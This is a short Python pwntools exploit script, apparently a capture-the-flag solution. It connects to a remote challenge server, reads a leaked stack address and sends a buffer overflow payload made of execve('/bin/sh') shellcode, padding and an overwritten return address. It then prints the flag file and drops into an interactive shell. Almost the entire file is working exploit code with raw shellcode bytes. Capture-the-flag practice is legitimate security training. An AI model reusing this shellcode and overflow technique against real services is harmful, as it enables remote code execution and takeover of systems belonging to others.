#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11002

yuan = remote(host,port)

# int --> 4 bytes char ----> 1 bytes
# getline has '\0' in the end of the input string

#00400666 27
#29
#0000000000400666
#0x70
#var_70 Hopper disass
#x86_64 8 16 (bytes)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s2 = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
pool = [102,102,102,102,102,102,102,102,7,134]

test = "\xbf\x61\x07\x40\x00" + "\xe8\x8b\xfe\xff\xff"
yuan.recvuntil("x")
ad = yuan.recvuntil("\n")
print(ad)
ab = "7fffffffe050" #fuck this
num = int(ab,16) - int(ad,16)
print (ab)
print (ad)
print (num)
payload = shellcode+"a"*93 +chr(int(ad[10:-1],16))+chr(int(ad[8:-3],16))+chr(int(ad[6:-5],16))+chr(int(ad[4:-7],16))+chr(int(ad[2:-9],16))+chr(int(ad[:-11],16))
#print("fwefefewfew\\fewfewfwe")
print "Payload --> " , payload
#yuan.sendline("2147483647")
#yuan.recvuntil("?")
yuan.sendline(payload)
yuan.sendline("cat /home/bof_shellcode/flag")
#yuan.recvuntil(".")
#str = yuan.recvall()
#print(str)
yuan.interactive()
#yuan.close()
